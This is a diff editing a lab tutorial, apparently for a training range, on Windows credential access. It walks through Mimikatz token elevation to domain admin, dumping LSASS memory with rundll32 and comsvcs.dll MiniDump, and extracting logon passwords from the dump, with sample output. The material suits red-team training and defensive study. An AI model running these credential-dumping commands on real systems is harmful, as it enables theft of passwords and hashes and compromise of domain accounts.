@@ -176,6 +176,7 @@ Let's access some credentials!
     
     ```
     mimikatz # token::elevate /domainadmin
+    
     Token Id  : 0
     User name :
     SID name  : WHEEL\Domain Admins
@@ -212,10 +213,10 @@ Many methods exist to dump LSASS, but we'll be covering a method that uses a LOL
 
     **Note that the number listed in the "Id" column, the PID, will most likely be different for you.** Take note of the PID returned when you run your command, as you'll need it in the next step.
 
-1. Ensuring you are still in an elevated prompt, use RunDLL to load the exported function "MiniDump" from the `comsvcs.dll` library. Ensure to replace `[PID]` with the PID of `lsass.exe` running on your system, which you obtained in the previous step.
+1. Ensuring you are still in an elevated prompt, use RunDLL to load the exported function "MiniDump" from the `comsvcs.dll` library. **Ensure to replace `[PID]` with the PID of `lsass.exe` running on your system, which you obtained in the previous step.**
     
     ```
-    rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump [PID] C:\Windows\temp\mini.dump full
+    rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump [PID] C:\Windows\temp\lsass.dmp full
     ```
     
     - For example, in our test enviornment, the PID for LSASS was `1372`. Thus, we would want to run:
@@ -227,21 +228,19 @@ Many methods exist to dump LSASS, but we'll be covering a method that uses a LOL
 1. In Mimikatz, and this can be done "offline", load the LSASS dump you obtained:
     
     ```
-    mimikatz # sekurlsa::minidump lsass.dmp
+    sekurlsa::minidump C:\windows\temp\lsass.dmp
     ```
     
     Example output if you run in the range (i.e. not offline, but rather point Mimikatz to the file you dumped):
     
     ```
-    sekurlsa::minidump C:\windows\temp\lsass.dmp
-    
     Switch to MINIDUMP : 'C:\windows\temp\lsass.dmp'
     ```
 
-1. Now that you have loaded the dumped LSASS memory space, you can now run Mimikatz against the dump file:
+1. Now that you have loaded the dumped LSASS memory space, you can now run commands against the dump file:
 
     ```
-    mimikatz # sekurlsa::logonPasswords full
+    sekurlsa::logonPasswords full
     ```
 
 ----
